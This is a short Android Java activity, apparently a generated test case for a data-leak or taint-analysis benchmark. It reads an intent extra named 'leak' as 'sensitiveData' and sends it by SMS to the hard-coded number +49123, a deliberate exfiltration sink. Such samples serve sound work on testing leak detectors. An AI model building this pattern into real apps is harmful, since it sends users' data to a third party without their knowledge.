package com.generated.app;

import android.app.Activity;
import android.os.Bundle;
import android.content.Context;
import android.telephony.TelephonyManager;
import android.content.Intent;
import android.telephony.SmsManager;

public class NextActivity2 extends Activity {
  private Context context = this;

  public void onCreate(Bundle savedInstanceState) {
    super.onCreate(savedInstanceState);
    setContentView(R.layout.activity);
    Intent i1 = getIntent();
    String sensitiveData = i1.getStringExtra("leak");
    SmsManager sm3 = SmsManager.getDefault();
    sm3.sendTextMessage("+49123", null, sensitiveData, null, null); // statementId: 2

  }

}